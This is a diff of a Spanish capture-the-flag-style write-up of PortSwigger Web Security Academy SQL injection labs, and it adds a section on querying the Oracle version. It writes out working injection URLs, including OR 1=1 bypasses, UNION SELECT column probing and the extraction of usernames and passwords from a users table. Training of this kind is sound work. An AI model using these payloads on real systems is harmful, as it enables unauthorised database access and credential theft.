@@ -50,7 +50,7 @@ Tal y como aparece en la descripción, el lab es sensible a inyecciones SQL. Nad
 
 Siendo released=1 los productos que se pueden mostrar. Pues bien, con añadir sencillamente  un 
 
-`'+OR+1=1–` a la url, es decir: `https://.../filter?category=Corporate+gifts’+OR+1=1–`, el comando debería cambiar a algo así como: 
+`'+OR+1=1–` a la url, es decir: `https://.../filter?category=Corporate+gifts'+OR+1=1–`, el comando debería cambiar a algo así como: 
 
 `SELECT * FROM products WHERE category = 'Corporate+gifts' OR 1=1--'`
 
@@ -96,7 +96,7 @@ El reto consiste precisamente en buscar el número de columnas de la tabla categ
 Nada más abrir la página del lab, hago click en cualquiera de las categorías (en mi caso Food & Drink). Tan sólo hay que añadir UNION SELECT y algún valor que no genere ninguna respuesta inadecuada en el comando, para lo cual el parámetro NULL nos viene perfecto. Así que hemos de añadir ‘+UNION+SELECT+NULL– a la url. Si todo va bien, nos devolverá una página con el status 200. De no ser así, habrá que ir añadiendo ,NULL hasta que funcione, y así sabremos el número de columnas de la tabla. 
 
 **Solución:**  
-`https://..?category=Food+%26+Drink%27+UNION+SELECT+NULL,NULL,NULL--`
+`https://..?category=Food+%26+Drink'+UNION+SELECT+NULL,NULL,NULL--`
 
 Es decir, 3 columnas. 
 
@@ -109,7 +109,7 @@ De nuevo, nuestro lab contiene una vulnerabilidad en category. Ya sabemos que ha
 Con lo que hemos visto hasta ahora, resulta sencillo. Simplemente habría que ir reemplazando los NULL del ejercicio anterior por un parámetro de tipo string (de tipo texto) , por ejemplo ‘a’ (una vez dentro del lab hay una pequeña descripción que dice que tenemos que hacer que la base de datos nos devuelva ‘BVWP3H’)
 
 **Solución:** 
-`https://...filter?category=Clothing%2c+shoes+and+accessories%27+UNION+SELECT+NULL,%27BVWP3H%27,NULL–`
+`https://...filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,'BVWP3H',NULL–`
 
 Es decir, la segunda columna es de tipo string. 
 
@@ -125,18 +125,18 @@ Se trata de un lab similar a los dos anteriores, pero en esta ocasión hay que a
 
 Empiezo inyectando un ataque mediante UNION añadiendo '+UNION+SELECT+NULL– a la url. No funciona. Añado otro NULL más y ahora sí. 
 
-`https://…/filter?category=Gifts%27+UNION+SELECT+NULL,NULL– `
+`https://…/filter?category=Gifts'+UNION+SELECT+NULL,NULL– `
 
 Funciona. Hay dos columnas. 
 
 Deduzco que ambas son de tipo string pero por si acaso, compruebo. 
 
-`https://..filter?category=Gifts%27+UNION+SELECT+%27a%27,%27b%27–`
+`https://..filter?category=Gifts'+UNION+SELECT+'a','b''–`
 
 Todo correcto. Tan sólo queda reemplazar los valores ‘a’ y ‘b’ del parámetro anterior por username y password y añadir la tabla sobre la que queremos lanzar la búsqueda (FROM users en este caso). 
 
 **Solución:** 
-`https://acb31fdf1efcae16c02c9680008d005d.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+username,password+FROM+users–`
+`https://acb31fdf1efcae16c02c9680008d005d.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+username,password+FROM+users–`
 
 Y listo. En la respuesta se añadieron los usuarios wiene, administrator y carlos. Copio el password de administrator para hacer log in y reto superado.
 
@@ -148,29 +148,41 @@ Ahora bien, ¿qué occuriría si la tabla sobre la que quiero ejecutar mi petici
 
 Una vez más, empiezo inyectando un ataque mediante UNION añadiendo '+UNION+SELECT+NULL– a la url. No funciona. Añado otro NULL más y ahora sí. 
 
-`https://…/filter?category=Gifts%27+UNION+SELECT+NULL,NULL– `
+`https://…/filter?category=Gifts'+UNION+SELECT+NULL,NULL– `
 
 Funciona. Hay dos columnas. 
 
 Ahora bien, en esta ocasión creo que sólo una de ellas será de tipo string. Lo compruebo con 
 
-`https://ac211fd71f9c8c3bc02c4a59002a009f.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+%27a%27,%27b%27–`
+`https://ac211fd71f9c8c3bc02c4a59002a009f.web-security-academy.net/filter?category=Corporate+gifts'+UNION+SELECT+'a','b'–`
 
 que no funciona. Cambio a :
 
-```https://ac211fd71f9c8c3bc02c4a59002a009f.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+%27a%27,NULL–```
+```https://ac211fd71f9c8c3bc02c4a59002a009f.web-security-academy.net/filter?category=Corporate+gifts'+UNION+SELECT+'a',NULL–```
 
 Y tampoco. Y por fin:
-```https://ac211fd71f9c8c3bc02c4a59002a009f.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+NULL,%27a%27–```
+```https://ac211fd71f9c8c3bc02c4a59002a009f.web-security-academy.net/filter?category=Corporate+gifts'+UNION+SELECT+NULL,'a'–```
 
 Me da una respuesta válida. ¿Y ahora, cómo obtengo el username y password en una sola petición? Mi primer instinto es hacer dos separadas, una para el username y otra para el password. Y efectivamente, funciona. Obtengo los nombres de usuario y los passwords por separado, pero no sería difícil combinarlos ( hay sólo 3 ). 
 
 El ejercicio sin embargo no va de eso, así que investigo un poco más. En este enlace vienen algunos ejemplos de string concatenation útiles. Pruebo con el primero para bases de datos Oracle y bingo. 
 
 **Solución:** 
-`https://../filter?category=Corporate+gifts%27+UNION+SELECT+NULL,username||password+FROM+users–`
+`https://../filter?category=Corporate+gifts'+UNION+SELECT+NULL,username||password+FROM+users–`
 
 Retorna el administrador junto al password. Hago log in y reto superado. 
+
+#  Lab #7 :(SQL injection attack, querying the database type and version on Oracle)<a id="lab7"></a>
+
+Ahora vamos a intentar averigüar el tipo de base de datos y la versión, lo cual puede ser el inicio de un vector de ataque.
+
+Para ello estos dos enlaces pueden ser de gran utilidad. Necesitamos obtener la version y el nombre de la base de datos, y tal como aquí aparece esto se define como [BANNER en Oracle](https://docs.oracle.com/en/database/oracle/oracle-database/18/refrn/V-VERSION.html)
+
+Por otra parte, hay que recordad que los ataques a una base de datos de Oracle hay que especificar una tabla desde la que obtener los resultados. Es decir, una tabla tras el parámetro FROM. Por ejemplo: UNION SELECT ‘abc’ FROM tabla.  Y tal y como aparece aquí, las diferentes bases de datos difieren un poco en la manera de llamar a la versión. https://portswigger.net/web-security/sql-injection/examining-the-database
+
+Tras realizar los pasos anteriores para definit el número de columnas, y teniendo en cuenta todo lo anterior (y que estamos ante una base de datos de ORACLE) , la inyección resulta relativamente sencilla: 
+
+https://acae1fd31e0f14cac0487b430057003d.web-security-academy.net/filter?category=Food+%26+Drink%27+UNION+SELECT+BANNER,null+FROM+v$version–
 
 
 
